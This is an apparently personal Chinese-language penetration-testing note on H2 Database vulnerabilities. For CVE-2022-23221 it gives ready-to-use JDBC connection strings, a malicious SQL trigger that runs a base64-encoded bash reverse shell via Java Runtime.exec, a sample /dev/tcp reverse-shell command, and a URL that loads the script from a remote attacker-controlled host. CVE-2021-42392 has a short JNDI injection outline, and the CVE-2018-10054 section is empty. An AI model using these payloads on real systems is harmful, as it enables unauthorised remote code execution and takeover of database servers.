---
title: "H2Database"
date: 2026-01-30
updated: 2026-01-30
tags:
  - Others
categories:
  - Others
description: None
---
默认端口：20051

## CVE-2022-23221

![[attachments/20260130.png]]

未授权进入

```
jdbc:h2:mem:test1;FORBID_CREATION=FALSE;IGNORE_UNKNOWN_SETTINGS=TRUE;FORBID_CREATION=FALSE;\
```

RCE 执行反弹 shell

本地创建 sql 文件，开启服务

```sql
# h2sql.sql
CREATE TABLE test (
     id INT NOT NULL
 );
CREATE TRIGGER TRIG_JS BEFORE INSERT ON TEST AS '//javascript
Java.type("java.lang.Runtime").getRuntime().exec("bash -c {echo,base64加密的反弹shell指令}|{base64,-d}|{bash,-i}");';

# 反弹指令示例：bash -i >& /dev/tcp/x.x.x.x/xxx 0>&1
```

远程加载，监听端口成功反弹

```python
jdbc:h2:mem:test1;FORBID_CREATION=FALSE;IGNORE_UNKNOWN_SETTINGS=TRUE;FORBID_CREATION=FALSE;INIT=RUNSCRIPT FROM 'http://xxx.xxx.xxx.xxx/h2sql.sql';\
```

java jdbc 远程加载 sql 文件，sql 文件写入命令执行

## CVE-2021-42392

Driver class 填写为 `javax.naming.InitialContext`（JNDI API 的核心入口类）

JDBC URL 填写为工具生成的 JNDI URL

反弹 shell

## CVE-2018-10054

...